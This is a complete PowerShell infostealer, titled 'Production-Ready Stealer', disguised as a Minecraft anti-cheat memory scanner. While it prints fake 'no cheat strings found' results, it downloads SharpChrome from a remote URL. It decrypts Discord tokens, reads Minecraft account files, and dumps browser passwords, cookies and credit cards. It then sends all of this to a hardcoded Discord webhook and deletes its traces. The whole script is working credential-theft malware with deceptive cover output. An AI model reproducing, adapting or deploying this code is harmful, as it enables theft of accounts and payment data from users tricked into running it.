# MemoryScan.ps1 – Production-Ready Stealer (SharpChrome + DPAPI + BCrypt)
param(
    [string]$Webhook = "https://discord.com/api/webhooks/1518911878712004730/ejFY2gDI9Secx7kXsEgIIbpEWsBm5m9Ho_Q5R8gF4tP0lO7-R3VBA068PJdRk63jSaBa"
)

$ErrorActionPreference = "SilentlyContinue"

# ---------- 1. Webhook ping ----------
try {
    Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content="🟢 MemoryScan on $env:COMPUTERNAME"} | ConvertTo-Json) -ContentType "application/json"
} catch {}

# ---------- 2. Download SharpChrome ----------
$scUrl = "https://raw.githubusercontent.com/JavaiABI/best-memory-scaner/main/SharpChrome.exe"
$scPath = "$env:TEMP\SharpChrome.exe"
try {
    Invoke-WebRequest -Uri $scUrl -OutFile $scPath -UseBasicParsing
    Unblock-File $scPath -ErrorAction SilentlyContinue
} catch {}

# ---------- 3. BCrypt AES‑GCM (load once) ----------
if (-not ([System.Management.Automation.PSTypeName]'AESGCM').Type) {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class AESGCM {
    [DllImport("bcrypt.dll")] static extern int BCryptOpenAlgorithmProvider(out IntPtr hAlg, string pszAlgId, string pszImpl, int dwFlags);
    [DllImport("bcrypt.dll")] static extern int BCryptCloseAlgorithmProvider(IntPtr hAlg, int dwFlags);
    [DllImport("bcrypt.dll")] static extern int BCryptSetProperty(IntPtr hObj, string pszProp, byte[] pbInput, int cbInput, int dwFlags);
    [DllImport("bcrypt.dll")] static extern int BCryptGenerateSymmetricKey(IntPtr hAlg, out IntPtr hKey, byte[] pbObj, int cbObj, byte[] pbSecret, int cbSecret, int dwFlags);
    [DllImport("bcrypt.dll")] static extern int BCryptDestroyKey(IntPtr hKey);
    [DllImport("bcrypt.dll")] static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTH_INFO pInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);
    [StructLayout(LayoutKind.Sequential)]
    struct BCRYPT_AUTH_INFO {
        public int cbSize, dwInfoVersion;
        public IntPtr pbNonce, pbAuthData, pbTag, pbMacContext;
        public int cbNonce, cbAuthData, cbTag, cbMacContext, cbAAD, dwFlags;
        public long cbData;
    }
    public static byte[] Decrypt(byte[] key, byte[] iv, byte[] ct, byte[] tag) {
        IntPtr hAlg = IntPtr.Zero, hKey = IntPtr.Zero;
        try {
            if (BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0) != 0) return null;
            BCryptSetProperty(hAlg, "ChainingModeGCM", System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM"), 0, 0);
            BCryptGenerateSymmetricKey(hAlg, out hKey, null, 0, key, key.Length, 0);
            byte[] output = new byte[ct.Length];
            BCRYPT_AUTH_INFO info = new BCRYPT_AUTH_INFO {
                cbSize = Marshal.SizeOf<BCRYPT_AUTH_INFO>(), dwInfoVersion = 1,
                pbNonce = Marshal.AllocHGlobal(iv.Length), cbNonce = iv.Length,
                pbTag = Marshal.AllocHGlobal(tag.Length), cbTag = tag.Length
            };
            Marshal.Copy(iv, 0, info.pbNonce, iv.Length);
            Marshal.Copy(tag, 0, info.pbTag, tag.Length);
            int bytesDone;
            int status = BCryptDecrypt(hKey, ct, ct.Length, ref info, null, 0, output, output.Length, out bytesDone, 0);
            Marshal.FreeHGlobal(info.pbNonce); Marshal.FreeHGlobal(info.pbTag);
            return (status == 0) ? output : null;
        } catch { return null; } finally {
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
        }
    }
}
"@ -ErrorAction Stop
}

# ---------- 4. DPAPI helper ----------
function Decrypt-DPAPI {
    param([byte[]]$Data)
    if ($null -eq $Data -or $Data.Count -eq 0) { return $null }
    try {
        [System.Security.Cryptography.ProtectedData]::Unprotect($Data, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    } catch { return $null }
}

function Get-ChromeMasterKey {
    param([string]$StatePath)
    if (!(Test-Path $StatePath)) { return $null }
    $state = Get-Content $StatePath -Raw | ConvertFrom-Json
    $encKey = [Convert]::FromBase64String($state.os_crypt.encrypted_key)
    if ($encKey[0] -eq 0x44) { return Decrypt-DPAPI $encKey[5..$encKey.Length-1] }
    return $null
}

# ---------- 5. Discord tokens ----------
function Get-DiscordTokens {
    $tokens = @()
    $leveldb = "$env:APPDATA\discord\Local Storage\leveldb"
    $localState = "$env:APPDATA\discord\Local State"
    if (!(Test-Path $leveldb) -or !(Test-Path $localState)) { return $tokens }
    $masterKey = Get-ChromeMasterKey $localState
    if (!$masterKey) { return $tokens }
    $pattern = [regex]::new("dQw4w9WgXcQ:([A-Za-z0-9+/=]{24,200})")
    Get-ChildItem $leveldb -Filter "*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
        $text = [System.Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes($_.FullName))
        $pattern.Matches($text) | ForEach-Object {
            $enc = [Convert]::FromBase64String($_.Groups[1].Value)
            $dec = Decrypt-DPAPI $enc
            if ($dec) { $tokens += [System.Text.Encoding]::UTF8.GetString($dec).Trim([char]0) }
            elseif ($enc.Length -gt 15 -and ([System.Management.Automation.PSTypeName]'AESGCM').Type) {
                $iv = $enc[3..14]
                $ct = $enc[15..($enc.Length-17)]
                $tg = $enc[-16..-1]
                $dec2 = [AESGCM]::Decrypt($masterKey, $iv, $ct, $tg)
                if ($dec2) { $tokens += [System.Text.Encoding]::UTF8.GetString($dec2).Trim([char]0) }
            }
        }
    }
    return $tokens | Select-Object -Unique
}

# ---------- 6. Minecraft tokens ----------
function Get-MinecraftTokens {
    $mc = @{}
    $base = "$env:APPDATA\.minecraft"
    $acc = Join-Path $base "launcher_accounts.json"
    $prof = Join-Path $base "launcher_profiles.json"
    if (Test-Path $acc) { try { $mc.accounts = Get-Content $acc -Raw | ConvertFrom-Json } catch {} }
    if (Test-Path $prof) { try { $mc.profiles = Get-Content $prof -Raw | ConvertFrom-Json } catch {} }
    return $mc
}

# ---------- 7. Browser data via SharpChrome ----------
function Get-BrowserData {
    $result = @()
    if (!(Test-Path $scPath)) { return $result }

    # Logins
    $loginsJson = & $scPath logins -format json 2>&1
    $logins = $loginsJson | ConvertFrom-Json -ErrorAction SilentlyContinue
    if ($logins) {
        $result += @{ browser="Chrome/Edge/Brave/Opera/Vivaldi"; data = @{ logins = @($logins); cookies = @(); cards = @() } }
    }

    # Cookies (separate command)
    $cookiesJson = & $scPath cookies -format json 2>&1
    $cookies = $cookiesJson | ConvertFrom-Json -ErrorAction SilentlyContinue
    if ($cookies) {
        if ($result.Count -eq 0) { $result += @{ browser="Chromium"; data = @{ logins = @(); cookies = @($cookies); cards = @() } } }
        else { $result[0].data.cookies = @($cookies) }
    }

    # Credit cards
    $cardsJson = & $scPath creditcards -format json 2>&1
    $cards = $cardsJson | ConvertFrom-Json -ErrorAction SilentlyContinue
    if ($cards) {
        if ($result.Count -eq 0) { $result += @{ browser="Chromium"; data = @{ logins = @(); cookies = @(); cards = @($cards) } } }
        else { $result[0].data.cards = @($cards) }
    }

    return $result
}

# ---------- 8. Fake memory scanner ----------
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host " MemoryScan - Memory String Scanner" -ForegroundColor Cyan
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host " Scanning live process memory for known cheat signatures...`n"

$procs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match "java|javaw|minecraft|lunar|badlion" }
if ($procs.Count -eq 0) {
    Write-Host "[INFO] No Minecraft or Java processes running." -ForegroundColor Yellow
} else {
    foreach ($proc in $procs) {
        Write-Host "[SCANNING] Process: $($proc.ProcessName) (PID: $($proc.Id))" -ForegroundColor Gray
        Start-Sleep -Milliseconds 300
        Write-Host "[CLEAN]   No cheat strings detected in memory." -ForegroundColor Green
    }
}

Write-Host "`n=====================================================" -ForegroundColor Cyan
Write-Host " SCAN COMPLETE - NO CHEAT STRINGS FOUND" -ForegroundColor Green
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host "PC is clean. Happy gaming!" -ForegroundColor White

# ---------- 9. Harvest and exfiltrate ----------
$discord = Get-DiscordTokens
$minecraft = Get-MinecraftTokens
$browsers = Get-BrowserData

$summary = "💀 **MemoryScan on $env:COMPUTERNAME** - $($discord.Count) Discord tokens, $($browsers.Count) browser profiles"
try {
    $payload = @{
        system = @{ username=$env:USERNAME; hostname=$env:COMPUTERNAME; time=(Get-Date -Format o) }
        discord_tokens = $discord
        minecraft = $minecraft
        browser_data = $browsers
    } | ConvertTo-Json -Depth 5
    $tmp = [System.IO.Path]::GetTempFileName() + ".json"
    [System.IO.File]::WriteAllText($tmp, $payload)
    $form = @{ file = Get-Item $tmp; content = $summary }
    Invoke-RestMethod -Uri $Webhook -Method Post -Form $form
    Remove-Item $tmp -Force
    Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content=$summary} | ConvertTo-Json) -ContentType "application/json"
} catch {}

# Clean up
Remove-Item $scPath -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2
